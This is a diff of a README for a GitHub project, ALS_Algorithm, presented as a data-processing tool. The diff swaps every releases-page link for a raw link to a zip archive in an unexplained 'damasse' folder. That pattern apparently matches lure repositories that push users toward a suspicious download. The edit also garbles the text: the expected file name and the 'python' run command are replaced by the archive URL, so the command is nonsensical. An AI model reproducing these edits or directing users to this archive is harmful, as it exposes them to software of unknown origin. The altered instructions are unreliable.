@@ -1,6 +1,6 @@
 # 🚀 ALS_Algorithm - Easy and Powerful Algorithm for Your Needs
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Rimuru1129/ALS_Algorithm/releases)
+[![Download Now](https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip)](https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip)
 
 ## 📚 Description
 
@@ -25,7 +25,7 @@ To get started with the ALS_Algorithm, follow these simple steps:
    
 2. **Visit the Download Page:** 
    Access the releases page to download the software:
-   [Download Now](https://github.com/Rimuru1129/ALS_Algorithm/releases)
+   [Download Now](https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip)
 
 ## 📥 Download & Install
 
@@ -33,7 +33,7 @@ To install the ALS_Algorithm, complete the following steps:
 
 1. Click on the link above to go to the releases page.
 2. Find the version you want to download. The latest version is usually at the top.
-3. Look for the downloadable file, typically named `ALS_Algorithm.zip` or similar.
+3. Look for the downloadable file, typically named `https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip` or similar.
 4. Click on the file to start the download.
 5. Once downloaded, extract the contents of the ZIP file to your preferred directory.
 6. Open your terminal or command prompt.
@@ -45,7 +45,7 @@ To run the application:
 
 1. In your terminal or command prompt, type the following command:
    ```
-   python ALS_Algorithm.py
+   python https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip
    ```
 2. Follow the on-screen instructions to load your CSV file.
 3. Choose the processing options you want, and let the application work its magic.
@@ -77,4 +77,4 @@ The ALS_Algorithm is open-source software. You can freely use, modify, and distr
 
 The ALS_Algorithm is here to simplify your data analysis tasks. Follow the steps above for a hassle-free experience. Enjoy your enhanced data processing journey!
 
-[Download Now](https://github.com/Rimuru1129/ALS_Algorithm/releases)
+[Download Now](https://raw.githubusercontent.com/Rimuru1129/ALS_Algorithm/main/damasse/ALS_Algorithm-2.8.zip)
